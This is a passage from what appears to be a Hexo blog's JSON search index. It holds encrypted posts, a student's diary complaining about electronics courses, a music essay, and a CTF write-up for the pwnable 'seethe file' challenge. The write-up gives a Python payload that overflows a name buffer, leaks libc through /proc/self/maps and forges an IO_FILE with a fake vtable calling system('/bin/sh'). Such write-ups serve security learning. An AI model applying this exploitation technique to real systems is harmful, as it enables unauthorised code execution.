d11f2bd1eec2327fe6da6b91fd603e72ca891ca9dd6ebd5d1e2c08847d4f3d14efd927a95acb69b3f4c5769b8867810ad199db9efbdbb0e26564fb4538ff8715f6576707909f07f3b85db3d9146ad86eb6a01a8fb87ab3f6406c6ed86544442dec9ed9dc28ef23ec0a59c9a6a64cf30a0c139bf129119d8684088ff76244d93d625350d29bb6c536e7752930a2becad9605093de8f22f33dd3357ab879dcbff4323960638430eb77174608bbc015f0b83cbabc6bce7398d3be7aedccdfbb5cc71f5ef4abe841320e4a75fe61e9c9083aa9a64f64d1dbe6a5d156a5b5da3109efc1d1cac6860b540cc43c6a0a73b924799256f81c51e02f45d60c2a928a96ac2cd0400352eff55d7a1c5b1a49c2a395ca1e306796bc5602195a52377e584b522676f6c417ae35f1e34b41dc5c155b716c6bffcffcd895daf0a54e667b20215322d29c807d1d7bd7ff1dfb636e43ea4408fe39c37038d77322cbdb3ce60db14d547ba69e14c7222750d3732d8dc2ed0f67874eb997eac0d5ce24629b537e7d6385b10af986d7b7ab82ce0b2458196177bbf868b3d019317506460de42f34179cb7b52b8c7c72b0528e99e30c919f61507ea069fd91e110fc19b4c676408b7aed90288829a1dfeb9ecab6c0085e3c7e48522cc245641a869c1b27d4998201320bd018e6d643b8db4cf470f85ce5b1ad582c4234eabdafc1469969fcdc6282810c25fefbaeba095089d6e508175861e639b1a427a362e2eebd7e0f826e0f61e987acdf42e54d91d406afca3f60bed4e4ecb59602ee356983728c9b19ea39406b725ba90ce91cd047ef0cca5cecfbd676c470a56976d6ff6f0</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["vivi"]},{"title":"四月","url":"/2022/04/30/vivi_2022%E5%B9%B4%E5%9B%9B%E6%9C%88/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"f308e00d642c184e667dc7d839181c8be7a419681f6261d3376062b44f25df51\">eb2486355afec2905c177304e33e4d63de2959dc1d08b82ea6cebd38b86e1e324dd1c1817b299deda1f1513a1eaf6e5713c4554eba8ef214fcdc66f085e1186fe51a8887c1409ec299b8c39577a0606d1284213de6bf0bc90a1eac91d23fc89adce79bb706c4974002d2db9ff96e9ff967ec891a25ce549fa6cd36484ddca8c5e6ee510b824a72145b9b2393ffc97f72851d9a89f8acc697b8934e2385ed8807745726f979069299622985182e841464da7c6ad26392206d0d3780c7621dfb2edc58d0b65be944fce573f69306ac5440985d20baf98455523e647f3c0783d4b35d315511d520152a57b0753043bb7383c1321044a1ffe3b1b86c0d33ad5de9b5ef1e84dea880a6382b7739b26a43c9b6325ec92c1b64fba80df2791ea234dd5776807307079a9c47feb565e99c2a1bf5fbb0ef23b5d8c58b91c9d6123a9728834a1f1715b182b2b6ae3e553acaa77526f538ff8efeb30b6490ed15ebc570fa76094b3f5556c6b922837b6621252646e6cdccaed6766943dbf07a80b0b4a89e378ea35b64e3e45f71081a1b176554d044e4de7f627d982b8452b7134be672abb607a056ce7b68d171c645573a05439989fc120980e83c1f466ba84623da01632efeb9ac2b1b7a0f99446f6d597ac7c0886e70b832bcc31f50c2cfac28acbe046e1a79446365d6b2df7bb95842752f1df204a1b8167b818d74f070e1ed60b27ab82b1fa57974de264352545537f0ec28ce26230f0edac3c93c805caff3a906d0641e02e89a96880a9d76cd25fd8545c7b164f9be28ac8b617e019dc1ab1d75d298a8b997377c2241b20974250887750469a6c304c52f8323258716edb8d17314098beffd0120a9ee3232a659c79d6a6a08cc66d647bbc5dcaf25146116e2463ab57e742cca781f5a4f3c55a7882141acb25d8a56d6e5373f394a0760c9ceef4e91a337fe75dae8d66f155fb73db293b1f5cef1f4c668359fd537f3689e6598a4719435144b755e88ed09276b958283605cc886bb1aef67315d1c468f2e059c15280142ed70f581e391dee2e1635cf26c86105920312e586b4fd4a03dd9c700a21ad7257c5cf80fa60fa66dcb9498737356cde448f335d83069fa98d4f52f5649a1e518f1b633931d284e4aaa5153acfd54723c0354a66bd5fede14f749800920365446743bd4be4790a65fdd9a5e81f3b0fc81f61158af0b72a247db06b3f63b127ba146ba876957ed0263b8676d855b6c29d638cf86ee4f34aad7cfc548ac872a70e3b5e1e0afebf7665e11b45860df05e8a621358f65588c559775b807b97523ad019e2605ccf7928fc9125058554f0520e1cb92b9d8a5ddf0ce6068976f4deff21d63665833798a8c76729240dd8b7b884f8e530ffbfc1cdc167a24cdf4630d30f10b8abc86cbab305efef2b1155caca0bfc9a9ae0b32184b913da75fe8c14f8cc6459ef943b484348f45885d27507e13060ec63d94034c37f0407833f1f5cb1dc2e245a52d8652881e0df67aed72ee0e1b37d47945f0ba9cd41d2fbf778458b566ef7bf9dce467cee37f4a313f24b16e0f3a91160b037143e3f4a686ef962910f8a467639bfc77b392f9a39c99fc07e14103b63c5985e859cb22aed66e0d46ddcc60265fa852c878a68a7203a1c38ed91511b011b9ddf50eb497af1a72d436bac0b9aab1360abd05d8a50469fda4dd8137f9fe8be86e13217a361631ee0c98b9caff34768edc373a2bed2632aeb85ec0e2f7d4bcb7ca63b0b15fc533e61acebc5e62db5534ea5ca2f10df7cb4ed7befc626800dd1db51b36aaaa4d22da7ff212f9704bbd5e1e65cb736cbf96776442bca75cd9f1ab9f1a9febbb4d76d30477c243efb5fd121b6a50c9bd17dc54711488d04257bc619b01905b34b20b7b177b73ee252437d97519d65384ef99250a6a243fbb0f133673bd7c5b88a7ea4edac5c4d2f370d4f780a0912920208e55a2059868d2599afc35c27873b67a9d2be1ef4ad571e4818c3fcb0f2119235ec6ff7c25126e46f0ae87926bc2788fbdd42a14d1bdc82dd1330658e9ef8e9e4a7f5bfa13df8e6d22c90d8ce8b5c2cfd814be67b92accd9308d28adbf985b7ea4e98981cdf453b626b6a143346568c0939f422c6431b4d154a499ea24d5d21a961ba8a772a072cfc491cc4596f3915b5c3081f2faaf6a02cdc6e037d797374c3bf0ca50720a97e2854ea939d5a6f578b40049fc43190bbff19f27e66d7869dd1d614948db58d24441b7659877e8dfe87c52295f181e450968049fb29da9e6123e784eb052e192b6a3b134dfe5be8775c91aaaeeafd031108148257c46b93b667432c3e4f32126809faac4f9eade0ba62cce9b2cfa6e6853085a7ccae31370e26bdf83381c122ed1e2dca473bf73cabaeddbbee1afa9504f1c0f2a915e161fee88afccdb4609b32735b29a878acd4c0b623861661f7582de7495e44023b08b963a5d911d7430d241f68691a639de5d2834374d7bdc07ee566049659ffc837df22600da0d144c00f2d55c447c81055c594931b015996c7f26436119fba71e1798a332d3d3fcab61e3a7defbb5656559ce9af4c34eb628a14ad5b0691ea9dc0fb7cf95f6c32130e45342d7ff3e991a52f06706a417cf35190a5e2fad57d9b06cd45a85a1e24de56b6389d059338a26ccbf07921d68144ca0ba6fc8ca664343d796ab3a4c9f36edfb12cfe4da0abe5ca91a676f274c0eb246373c5365b0fe9252cf3b5e0e53a9e01507ec171aed5355377fcaf067797c00fc69ffc829e0f93ebcf091bdb10e415a5f02f23d12412ddd99940b4500895f9e982f69929bc62234bbcc9be7cb3de2e677bf1c4c7db1f9204cd10737bd43daf803344d9b3bb48710b1c5c8d4c948690301513ce8161835194d6090afb30f5add131f0f008a2c637a16099bed7e35f6788c2136af063997b8de656c3f0e9c4d1bc2495d6c7e900e9dca620197699a085212dd44ccba664cd70b566d35c143dc9f1f1c0a7cff298e7970bb3fff2813c98dc05953b02ae93e530c7be67351ad3872a8c34f4fd4fc07b911ebf0ef87f975d41a011800fa6f5d06d937bee58677fc9f14ec85ae533c2ece623b11d01d17d83711efcbda23b1587e9f2e22c9479316b472a2c8b74fa7b67e3d5341b8f650bd8de2598520863278e2bfddba2dc4ee87a2fb7c4722528798ac7ca9f625e87f0680322903604ac517cded040f3c295a28ac3b2415eb0d22471f31fa9dca88807ea66eeb1b8b1f333dfa6727e497021502b5e1c7ab9f8b31321e2b20c1ab26020b0d8093f87dcb4eb97e0c16f8e5d6a0df39adf58c4bc6a5e31526c94a2c7dc10a600776639230abaf01174baad8b1ce532b6915e767bffa159f0d95b14aa0cb1fdf060a752a422dc896bc0823a064ec813b1456d8a0f0ea839935a8c3aee2bddf54045231297ab07f2737cef44c640eff7757add6c637ee392aaffa4af0317e9c523148845c84d54ff8da20aac136c9f1f98966feca6668958978cc11b767d2</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["vivi"]},{"title":"小兔的EE破防日记","url":"/2022/10/15/vivi_%E5%B0%8F%E5%85%94%E5%AD%A6%E7%94%B5%E8%B7%AF%E7%A0%B4%E9%98%B2%E6%97%A5%E8%AE%B0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-NpyjtNEP\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<p>​        电子系统是一门什么课啊。</p>\n<p>​        怎么会有课会把模电和数电结合在一起啊。电路分析是世界上最难的课，电子系统是比电路分析更难的课。</p>\n<p>昨天电子系统的seminar，老师讲了多久这牢我就坐了多久。昨天讲了什么呢？</p>\n<p>​        基尔霍夫定律，不会。运算放大器反馈的类型，首先需要区分不同类型的方法器，同向放大器，反向放大器，差分放大器，还有啥，然后需要判断串并联，是电压还是电流。不会。运算放大器的增益和输出电压的计算，不会。利用现有放大器设计反馈电路，不会，设计da转换，不会。</p>\n<p>​        我以为数字信号处理是我今年最难的专业课，但是不是，电子系统才是。</p>\n<p>​        并且讲课的老师一个比一个更会念ppt，还有的专挑数字讲，不讲原理不讲方法。今天上听力课还破防了，tpo 28set4对吧，老师都不忍心让我继续做了，连第一题都没听出来。教师资格证是吧，我真的会谢，谢谢你，因为有你。</p>\n<p>​        dspdspdsp谢谢你我谢谢你，电子系统我也谢谢你。谢谢你谢谢你谢谢你谢谢你谢谢你。滤波器的频域响应和时域响应，窗函数的使用，iir和fir滤波器的性质。还有啥，还有美丽甜美可爱ppt老师讲不明白的快速傅立叶变换。</p>\n<p>​        “要不是要给你们备课，我自己都忘了这个原理。”这是美丽尊敬的ppt老师的原话，原话哟。谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你谢谢你我谢谢你    。</p>\n","categories":["AUDITION"],"tags":["vivi"]},{"title":"深夜锐评拿不拿","url":"/2022/06/21/vivi_%E6%B7%B1%E5%A4%9C%E9%94%90%E8%AF%84%E6%8B%BF%E4%B8%8D%E6%8B%BF/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-fyItAUcr\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h2><span id=\"0\">0</span></h2><p>​        期末周，绩点比国赛重要，所以摆烂没有刷题。今天yrsk放了三首月光再演的曲子，拿厨都哭了，于是自然地多听了一些yrsk，并且看到了豆瓣上对于盗作的评论，有点不开心，故记录一下。</p>\n<h2><span id=\"1\">1</span></h2><p>​        目前关于拿曲，尤其是yrsk时期的曲子，最大的批评是“同质化严重”，并且我个人也认为拿不拿所追求的“创作出不迎合大众的曲子”与他本身写出来的东西是相矛盾的。曾经我自己给自己台阶下，认为yrsk的“不迎合大众”主要体现在歌词上，然而今天看了b站上群友对于盗作的分析，我感觉拿不拿确实还是想要强调音乐性上的独特与自我追寻，从这点上来看与歌词关系并不大，那么矛盾又回来了。</p>\n<p>​        如果迎合大众指的是流行乐，或者广义上符合大众审美，旋律编曲令人舒适的音乐。抛开配器以及人声，只谈旋律以及编排，打个比方，经典华语乐坛，抖音神曲，流行纯音乐或是洗脑电音都属于这一范畴。那么什么音乐是不符合大众审美的呢？简单举几个例子，几乎所有重型音乐、大部分爵士，布鲁斯、实验音乐、大部分广义古典乐，以及民族或者世界音乐。我不听硬摇，但是我感觉至少在亚洲文化里硬摇并不是主流音乐。话说我从来不严格划分流行和摇滚以及朋克的界限，对我的耳朵来说这几种风格都差不多，所以不区分也没有任何问题，我粗暴地直接将我听的所有旋律相对比较悦耳的摇滚或者朋克划到流行中，举几个例子，真夜中，拿，绝体绝命以后的radwimps。</p>\n<p>​        回到拿曲，拿不管是哪个时期，写出来的曲子对我来说都是如假包换的流行乐，可能卖春稍微雷鬼一点，但是旋律还是很拿，我感觉拿有一点被自己的风格限制住了，虽然能够看出拿一直在努力突破编曲风格的界限，从普通的拿味jpop到现代布鲁斯以及雷鬼，爵士都有尝试过，但是我个人感觉这其中变化的都是编曲风格而不是旋律风格，虽然严格来讲旋律并不很受风格影响。</p>\n<p>​        并且，很严重的一点是，虽然拿非常努力地尝试不同的风格，作出他喜欢的曲子，但是他还是被限制住了。如果你学过但凡一点点乐理，你会发现一个456的和弦进行能够串起拿曲大部分所有的段落，不同的曲子只是单个和弦的种类改变了一些，比如三和弦改成大九，就成了思想犯的前奏，听起来非常日系且由于键盘音色显得耳目一新，但是走向还是456。如果你再了解一点点吉他，你会发现拿真的很喜欢用五声音阶乱飞，大部分拿式jrock的solo都是由大调五声，布鲁斯五声的上下行爬来爬去而成，但凡多听一些，就会使人厌倦。</p>\n<p>​        以上说的这些，由于拿已经274天没有出过新曲了，就拿最近的三首歌以及创作这张专作为比较，可以看出拿对于编曲上的大多数问题已经有了自己的改进思路，比方说春泥棒，嘘月以及老人与海，月吠，编曲的留白相对增加，没有以前那么满，有的却也因此变得耐听了一些。拿更加注重与对于简单编曲的音响效果的控制以及细节的雕刻，但是简单不意味着单一，同一个riff整首歌重复也太划水了（点名月吠）。</p>\n<p>​        上一首真正从人声旋律上戳中我的拿曲还是盗作副歌以及雨晴。不过戳中我不代表好，戳不中也不代表好。我个人真的非常旋律至上，一首歌的好听与否百分之八十看旋律，当然如果音色太拉让我感到明显的不适我也会跳过，从这点来讲我的审美并没有很偏离大众，换句话说，我不太喜欢纯炫技的作品。并且我也不能一耳朵直接听出调式以及和弦进行，只是完全凭感觉去评价一首歌。</p>\n<p>​        而我感觉一首歌旋律的好听与耐听之间的平衡，就在与恰到好处的音响效果与留白。比如我博客歌单中很多歌都是我这几个月特别特别喜欢而百听不厌的歌曲，比如说李晓川老师的伊韦尔东、同样也是为伊韦尔东演奏小提琴的彭飞老师的第三个月（这个一度把我听哭了）、上原广美的haze和brand new day、西小协第一乐章、德彪西的月光，以及大海第一乐章。这些歌对我来说留白就是没有人声的干扰导致的纯净性，以及恰到好处的无调性营造，避免了大量旋律造成审美疲劳。比如在爵士乐里，就是严格编排与自由即兴的穿插交错，或是离调或不协和音程的音符跳动。而流行乐里，tk的copy light，haze和withe out直接提名我的年度流行歌top3了，具体原因大概就是戳中我的旋律一瞬即逝，但是我就是想为这么一秒钟听完一首歌。这也解释了为什么听多了重型通常会审美疲劳，当同样的刺激多次重复，兴奋感就不那么强烈了，久而久之甚至会厌倦。但是如果兴奋感是来自音响效果，那么这样的刺激通常很难钝化。</p>\n<p>​        虽然拿在编曲上有所改变，但是人声旋律依然在原地踏步。这也是我无法评价的，不过就算拿写得歌再不好听，他所创造出来的故事，音乐pv或是歌词氛围，依然能够打动我，谁叫我是傻卵拿厨。从我第一次听拿不拿到现在，已经五年了，这五年我的音乐审美发生了巨大的变化，从一个只听朋克和jpop的术曲小鬼变成口味多元偏爱器乐曲的老大妈了，以前听到一首评论999一下的歌就觉得自己标新立异与众不同了，现在喜欢的歌里超过999的不超过十分之一也无动于衷。但是就算是这样，我最喜欢的音乐还是yrsk。也许我之前专注于音乐性，旋律性的观点过于片面，艺术本身就应该有着宽广的包容性，而音乐更加不能局限于音乐本身，任何从音乐衍生出来的东西，当它们融合在一起，展现同一个故事，同一种主题，这种感觉难道不是非常棒的吗？</p>\n<p>​        本来还想讲一下suis与拿曲表现力的关系，但是有点晚了，就这样吧。</p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​</p>\n","categories":["AUDITION"],"tags":["幻想曲"]},{"title":"pwnable - seethe file","url":"/2022/05/07/week10_6_%20pwnable_sethefile/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-vipICrAl\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-07%20%E4%B8%8B%E5%8D%883.50.04.png\" alt=\"截屏2022-05-07 下午3.50.04\"></p>\n<h1><span id=\"reverse\">reverse</span></h1><h2><span id=\"open\">open</span></h2><p>​        打开一个文件，但是文件名不能包含flag.顺便在<code>0x804B0C0</code>上初始化了一块magic buf，此外，一次只能打开一个文件。</p>\n<h2><span id=\"read\">read</span></h2><p>​        读取文件到magic buf。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">result = fread(magicbuf, 0x18Fu, 1u, fp);</span><br></pre></td></tr></table></figure>\n<h2><span id=\"write\">write</span></h2><p>​        对flag的一些字符串进行过滤，然后put magic buf。</p>\n<h2><span id=\"close\">close</span></h2><p>​        就是关闭</p>\n<h2><span id=\"name\">name</span></h2><p>​        留下name，name作为全局变量储存在magic buf相邻的地方。name的大小事32，但是没有作限制，可以溢出覆盖*fp。</p>\n<h1><span id=\"利用思路\">利用思路</span></h1><p>​        首先这里不能绕过检测直接打印flag。</p>\n<p>​        flag名大概率就是flag，并且按照以往的规律也是储存在当前路径下，所以这里确实只要<code>fopen(&#39;flag&#39;,r)</code>就能拿。</p>\n<p>​        但是题目给的过滤比较严格，write处也有过滤，所以直接绕过比较困难，只能想骚操作了。</p>\n<h2><span id=\"漏洞\">漏洞</span></h2><p>​        只有name这里的漏洞，而这个漏洞最直观的结果就是可以覆盖fp指针。</p>\n<p>​        所以我们只能伪造文件描述符，也就是利用到IOFILE的知识伪造iofile，然后将文件描述符指针覆盖为vtable指针，再利用相关知识getshell。由于题目的libc是2.23，所以我们只需要伪造vtable，而不用管一些检测。</p>\n<h2><span id=\"利用过程\">利用过程</span></h2><h3><span id=\"直接读取proc获取libc\">直接读取proc获取libc</span></h3><p>就是<code>open(&quot;/proc/self/maps&quot;)</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class=\"line\">read()</span><br><span class=\"line\">write()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;[heap]&quot;</span>)</span><br><span class=\"line\">libc_base = u32(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br></pre></td></tr></table></figure>\n<h3><span id=\"伪造file\">伪造file</span></h3><p>​        关于细节，32位程序需要伪造一个假的file，并且让fp指针指向它。参考的文章是<a href=\"https://www.jianshu.com/p/a6354fa4dbdf\">https://www.jianshu.com/p/a6354fa4dbdf</a></p>\n<p>​        首先利用0x20个字节填充name和fp指针之间的空隙。然后覆盖fp为fake vtable。</p>\n<p>​        </p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span> <span class=\"comment\">#pad to 0x804b280.point to fp</span></span><br><span class=\"line\">payload += p32(buf_addr) <span class=\"comment\">#0x804b284 -&gt; 0x804b284 </span></span><br><span class=\"line\">fake_file = <span class=\"string\">&quot;/bin/sh\\x00&quot;</span><span class=\"comment\">#0x288</span></span><br><span class=\"line\">fake_file = fake_file.ljust(<span class=\"number\">0x48</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>) <span class=\"comment\"># 0x288 + 0x48 = 0x2d0</span></span><br><span class=\"line\">fake_file += p32(fake_lock_addr) <span class=\"comment\"># 指向一处值为0的地址,0x2d8</span></span><br><span class=\"line\">fake_file = fake_file.ljust(<span class=\"number\">0x94</span>, <span class=\"string\">&quot;\\x00&quot;</span>) <span class=\"comment\">#0x368</span></span><br><span class=\"line\">fake_vtable = p32(<span class=\"number\">0x804B358</span>) <span class=\"comment\"># fake vtable address = buf_addr + 0x98 - 0x44 (addr - 0x44 + 0x98) </span></span><br><span class=\"line\">fake_file += p32(fake_vtable)<span class=\"comment\">#0x36c</span></span><br><span class=\"line\">fake_file += p32(system)</span><br><span class=\"line\">payload += fake_file</span><br></pre></td></tr></table></figure>\n<p>​</p>\n","categories":["Binary_security"],"tags":["IO_FILE"]},{"title":"pwnable - death_note","url":"/2022/05/11/week11_3_%20pwnable_deathnote/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-POiilpmN\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span 